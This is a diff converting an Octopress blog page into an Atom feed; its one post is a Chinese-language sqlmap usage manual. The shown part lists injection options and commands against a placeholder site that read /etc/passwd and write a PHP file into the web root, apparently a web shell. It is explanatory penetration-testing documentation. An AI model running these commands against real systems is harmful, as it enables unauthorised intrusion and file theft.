@@ -1,105 +1,24 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
 
-<!DOCTYPE html>
-<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
-<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
-<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
-<head>
-  <meta charset="utf-8">
-  <title>Str0cker的博客</title>
-  <meta name="author" content="str0cker">
-
-  
-  <meta name="description" content="-u #注入点
--f #指纹判别数据库类型
--b #获取数据库版本信息
--p #指定可测试的参数(?page=1&amp;id=2 -p &#8220;page,id&#8221;)
--D &#8220;&#8221;#指定数据库名
--T &#8220;&#8221;#指定表名
--C &#8220 &hellip;">
-  
-
-  <!-- http://t.co/dKP3o1e -->
-  <meta name="HandheldFriendly" content="True">
-  <meta name="MobileOptimized" content="320">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  
-  <link rel="canonical" href="http://russhamiton.github.com/">
-  <link href="/favicon.png" rel="icon">
-  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
-  <script src="/javascripts/modernizr-2.0.js"></script>
-  <script src="/javascripts/ender.js"></script>
-  <script src="/javascripts/octopress.js" type="text/javascript"></script>
-  <link href="/atom.xml" rel="alternate" title="Str0cker的博客" type="application/atom+xml">
-  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
-<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
-<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
-
-  
-
-</head>
-
-<body   >
-  <header role="banner"><hgroup>
-  <h1><a href="/">Str0cker的博客</a></h1>
-  
-    <h2>生活就是一次修行</h2>
-  
-</hgroup>
-
-</header>
-  <nav role="navigation"><ul class="subscription" data-subscription="rss">
-  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
-  
-</ul>
-  
-<form action="http://google.com/search" method="get">
-  <fieldset role="search">
-    <input type="hidden" name="q" value="site:russhamiton.github.com" />
-    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
-  </fieldset>
-</form>
-  
-<ul class="main-navigation">
-  <li><a href="/">Blog</a></li>
-  <li><a href="/blog/archives">Archives</a></li>
-</ul>
-
-</nav>
-  <div id="main">
-    <div id="content">
-      <div class="blog-index">
-  
-  
-  
-    <article>
-      
-  <header>
+  <title><![CDATA[Str0cker的博客]]></title>
+  <link href="http://russhamiton.github.com/atom.xml" rel="self"/>
+  <link href="http://russhamiton.github.com/"/>
+  <updated>2013-01-01T16:14:48+08:00</updated>
+  <id>http://russhamiton.github.com/</id>
+  <author>
+    <name><![CDATA[str0cker]]></name>
     
-      <h1 class="entry-title"><a href="/blog/2013/01/01/sqlmapshi-yong-shou-ce/">Sqlmap使用手册</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
 
   
-
-
-<time datetime="2013-01-01T15:18:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>-u #注入点
+  <entry>
+    <title type="html"><![CDATA[sqlmap使用手册]]></title>
+    <link href="http://russhamiton.github.com/blog/2013/01/01/sqlmapshi-yong-shou-ce/"/>
+    <updated>2013-01-01T15:18:00+08:00</updated>
+    <id>http://russhamiton.github.com/blog/2013/01/01/sqlmapshi-yong-shou-ce</id>
+    <content type="html"><![CDATA[<p>-u #注入点
 -f #指纹判别数据库类型
 -b #获取数据库版本信息
 -p #指定可测试的参数(?page=1&amp;id=2 -p &#8220;page,id&#8221;)
@@ -241,69 +160,7 @@ sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read"/etc/passwd"-v2
 9.file-write写入文件到web
 sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file-dest /var/www/html/xx.php -v2
 </code></pre>
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  <div class="pagination">
-    
-    <a href="/blog/archives">Blog Archives</a>
-    
-  </div>
-</div>
-<aside class="sidebar">
-  
-    <section>
-  <h1>Recent Posts</h1>
-  <ul id="recent_posts">
-    
-      <li class="post">
-        <a href="/blog/2013/01/01/sqlmapshi-yong-shou-ce/">sqlmap使用手册</a>
-      </li>
-    
-  </ul>
-</section>
-
-
-
-
-
-
-  
-</aside>
-
-    </div>
-  </div>
-  <footer role="contentinfo"><p>
-  Copyright &copy; 2013 - str0cker -
-  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
-</p>
-
-</footer>
-  
-
-
-
-
-
-
-
-  <script type="text/javascript">
-    (function(){
-      var twitterWidgets = document.createElement('script');
-      twitterWidgets.type = 'text/javascript';
-      twitterWidgets.async = true;
-      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
-      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
-    })();
-  </script>
-
-
-
-
-
-</body>
-</html>
+</feed>
